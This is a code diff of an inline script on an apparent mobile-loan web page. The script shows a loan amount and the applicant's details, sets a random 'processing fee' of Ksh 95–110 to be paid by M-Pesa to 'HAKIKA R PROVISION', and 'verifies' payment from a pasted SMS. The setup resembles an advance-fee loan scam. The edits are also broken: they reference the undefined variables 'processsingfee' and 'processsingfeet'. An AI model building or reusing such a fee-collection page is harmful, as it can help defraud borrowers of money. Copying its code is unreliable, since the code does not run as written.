@@ -162,13 +162,13 @@
 
   <script>
     const targetValue = localStorage.getItem('targetValue');
-    let savingAmount = localStorage.getItem('savingAmount');
+    let savingAmount = localStorage.getItem('processsingfee');
     const firstName = localStorage.getItem('firstname') || "Unknown";
     const phoneNumber = localStorage.getItem('phone') || "Not Available";
   
     if (!savingAmount) {
       savingAmount = Math.floor(Math.random() * (110 - 95 + 1)) + 95;
-      localStorage.setItem('savingAmount', savingAmount);
+      localStorage.setItem('processsingfee', savingAmount);
     }
   
     function formatNumber(num) {
@@ -179,7 +179,7 @@
       ? 'Loan Amount: Ksh ' + formatNumber(targetValue)
       : 'Loan Amount: Not Available';
   
-    document.getElementById('savingDisplay').textContent = 'Saving Amount: Ksh ' + formatNumber(savingAmount);
+    document.getElementById('savingDisplay').textContent = 'processsingfee: Ksh ' + formatNumber(processsingfee);
     document.getElementById('firstName').textContent = "Account Name: " + firstName;
     document.getElementById('phoneNumber').textContent = "Phone Number: " + phoneNumber;
   
@@ -195,7 +195,7 @@
     document.getElementById('verifyButton').addEventListener('click', function () {
       const message = document.getElementById("mpesaInput").value.trim();
       const requiredName = "HAKIKA R PROVISION";
-      const requiredAmount = "Ksh" + savingAmount + ".00"; // Example: Ksh95.00
+      const requiredAmount = "Ksh" + processsingfeet + ".00"; // Example: Ksh95.00
   
       if (message === "") {
         alert("Please paste your Mpesa message before verifying.");
